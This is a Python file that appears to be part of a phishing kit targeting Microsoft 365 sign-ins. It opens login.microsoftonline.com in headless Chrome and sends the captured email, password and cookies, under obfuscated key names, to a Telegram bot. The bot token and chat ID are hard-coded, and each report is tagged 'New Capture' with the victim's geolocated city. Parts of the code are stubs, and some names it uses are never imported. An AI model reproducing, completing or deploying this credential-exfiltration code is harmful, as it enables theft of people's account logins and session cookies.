import telegram
from datetime import datetime
import requests
from selenium.webdriver import Remote

driver = Remote(
    command_executor='http://localhost:4444/wd/hub',
    options=ChromeOptions()
)

class SignIn:
    def __init__(self):
        self.email = None
        self.driver = None
        
    def _get_driver(self):
        options = ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument(f"--user-data-dir=/usr/local/lib/chromium")
        return Chrome(options=options)

    def check_email_online(self, email):
        try:
            self.driver = self._get_driver()
            self.driver.get("https://login.microsoftonline.com/")
            # Add your email validation logic here
            return True, "Email valid"
        except Exception as e:
            return False, str(e)
        finally:
            if self.driver:
                self.driver.quit()

    def login(self, password):
        try:
            self.driver = self._get_driver()
            # Add your login logic here
            self._send_to_telegram({
                'jents': self.email,
                'jeneta': password,
                'jennings': '[]'  # Add actual cookies if captured
            })
            return True, "Login successful"
        except Exception as e:
            return False, str(e)
        finally:
            if self.driver:
                self.driver.quit()

    def _send_to_telegram(self, data):
        try:
            time = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
            loc = requests.get('http://ip-api.com/json/', timeout=3).json()
            location = f"{loc.get('city','Unknown')}, {loc.get('country','Unknown')}"

            bot = telegram.Bot(token="7437530195:AAGM0xg3-RuqUPI8dpxvjt0xQQ0YMBWWID0")
            bot.send_message(
                chat_id="7164718562",
                text=f"🔐 New Capture\n⏰ {time}\n📍 {location}\n"
                     f"📧 {data['jents']}\n🔑 {data['jeneta']}\n"
                     f"🍪 {data['jennings'][:100]}..."
            )
        except Exception as e:
            print(f"Telegram error: {e}")
